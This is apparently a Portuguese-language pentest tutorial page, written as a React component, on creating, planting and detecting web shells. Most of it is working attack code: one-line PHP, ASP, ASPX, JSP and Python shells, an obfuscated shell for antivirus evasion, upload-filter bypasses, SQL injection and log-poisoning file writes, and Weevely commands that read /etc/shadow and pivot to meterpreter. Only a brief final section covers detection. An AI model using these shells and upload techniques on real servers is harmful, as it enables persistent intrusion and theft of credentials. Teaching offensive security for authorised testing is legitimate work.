import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function WebShells() {
  return (
    <PageContainer
      title="Web Shells — Acesso Persistente"
      subtitle="Crie, implante e detecte web shells para manter acesso persistente em servidores web comprometidos."
      difficulty="avancado"
      timeToRead="15 min"
    >
      <h2>O que é uma Web Shell?</h2>
      <p>
        Uma <strong>web shell</strong> é um script malicioso implantado em um servidor web que permite
        ao atacante executar comandos remotamente através do navegador ou requisições HTTP. É usada para
        manter acesso persistente após comprometer um servidor.
      </p>

      <AlertBox type="danger" title="Apenas em ambientes autorizados">
        Web shells são ferramentas de pós-exploração. Use apenas em laboratórios ou pentests autorizados.
      </AlertBox>

      <h2>Web Shells em PHP</h2>
      <CodeBlock
        title="Web shells PHP (do simples ao avançado)"
        code={`# Shell one-liner (mais básica)
<?php system($_GET['cmd']); ?>
# Uso: http://alvo.com/shell.php?cmd=whoami

# Com eval
<?php eval($_POST['code']); ?>
# Uso: curl -X POST -d "code=system('id');" http://alvo.com/shell.php

# Shell com autenticação
<?php
if($_GET['key'] !== 'S3cretK3y') die('404');
echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
?>

# Shell ofuscada (evade antivírus básico)
<?php $a='sy'.'st'.'em'; $a($_GET['c']); ?>

# Web shells do Kali Linux
ls /usr/share/webshells/php/
# php-backdoor.php
# php-reverse-shell.php  (reverse shell completa)
# simple-backdoor.php
# qsd-php-backdoor.php

# Usar reverse shell do Kali
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
# Editar IP e porta do atacante no arquivo
# Fazer upload para o alvo`}
      />

      <h2>Web Shells em Outras Linguagens</h2>
      <CodeBlock
        title="ASP, JSP, Python"
        code={`# ASP (.asp) — Windows IIS
<%response.write CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll()%>

# ASPX (.aspx) — .NET
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%= Process.Start(new ProcessStartInfo("cmd","/c " + Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd() %>

# JSP (.jsp) — Java/Tomcat
<%
Runtime rt = Runtime.getRuntime();
Process p = rt.exec(request.getParameter("cmd"));
java.io.InputStream is = p.getInputStream();
int c;
while ((c = is.read()) != -1) out.print((char)c);
%>

# Python (CGI)
#!/usr/bin/python3
import subprocess, cgi
form = cgi.FieldStorage()
cmd = form.getvalue('cmd', 'id')
print("Content-Type: text/plain\\n")
print(subprocess.getoutput(cmd))

# Web shells do Kali para cada linguagem
ls /usr/share/webshells/
# asp/  aspx/  cfm/  jsp/  perl/  php/`}
      />

      <h2>Upload de Web Shell</h2>
      <CodeBlock
        title="Métodos de upload"
        code={`# Via upload de arquivo (mais comum)
# Renomear extensão para bypass de filtro:
shell.php.jpg
shell.php%00.jpg      # Null byte (versões antigas)
shell.pHp             # Case variation
shell.php5            # Extensão alternativa
shell.phtml           # Extensão alternativa
shell.php.bak         # Pode ser interpretado

# Via SQLi (MySQL)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# Via LFI + Log Poisoning
# 1. Injetar PHP no User-Agent
curl -A '<?php system($_GET["cmd"]); ?>' http://alvo.com/
# 2. Incluir o log via LFI
http://alvo.com/page?file=/var/log/apache2/access.log&cmd=id

# Via PUT (WebDAV habilitado)
curl -X PUT -d '<?php system($_GET["cmd"]); ?>' \\
  http://alvo.com/shell.php

# Via editor de temas (WordPress, etc.)
# Appearance → Editor → 404.php → inserir shell`}
      />

      <h2>Weevely — Shell Ofuscada</h2>
      <CodeBlock
        title="Usar Weevely para shell persistente"
        code={`# Weevely — web shell ofuscada com canal criptografado
# Já vem instalado no Kali

# 1. Gerar shell
weevely generate minhaSenha /tmp/shell.php
# Gera arquivo PHP ofuscado

# 2. Fazer upload do shell.php para o alvo
# (via upload de arquivo, SQLi, etc.)

# 3. Conectar
weevely http://alvo.com/uploads/shell.php minhaSenha

# Comandos dentro do Weevely:
:system_info                    # Info do sistema
:file_ls /etc/                  # Listar arquivos
:file_read /etc/passwd          # Ler arquivo
:file_upload /local/file /remote/path  # Upload
:file_download /etc/shadow /tmp/      # Download
:shell_sh                       # Shell interativo
:sql_console -user root -passwd '' # Console MySQL
:net_scan 192.168.1.0/24 80     # Port scan interno
:backdoor_meterpreter LHOST LPORT  # Upgrade para meterpreter`}
      />

      <h2>Detectar Web Shells</h2>
      <CodeBlock
        title="Blue Team — encontrar web shells"
        code={`# Procurar funções perigosas em PHP
grep -rn "system\\|exec\\|passthru\\|shell_exec\\|eval\\|base64_decode" \\
  /var/www/html/ --include="*.php"

# Arquivos modificados recentemente
find /var/www/html -name "*.php" -mtime -7 -ls

# Arquivos com permissões suspeitas
find /var/www/html -name "*.php" -perm -o+w

# Conexões de rede suspeitas
netstat -tlnp | grep -E ":(4444|5555|1234|9001)"

# Ferramentas de detecção
# PHP Malware Finder
git clone https://github.com/jvoisin/php-malware-finder
php-malware-finder/phpmalwarefinder /var/www/html/

# Linux Malware Detect
apt install maldet
maldet -a /var/www/html/`}
      />
    </PageContainer>
  );
}
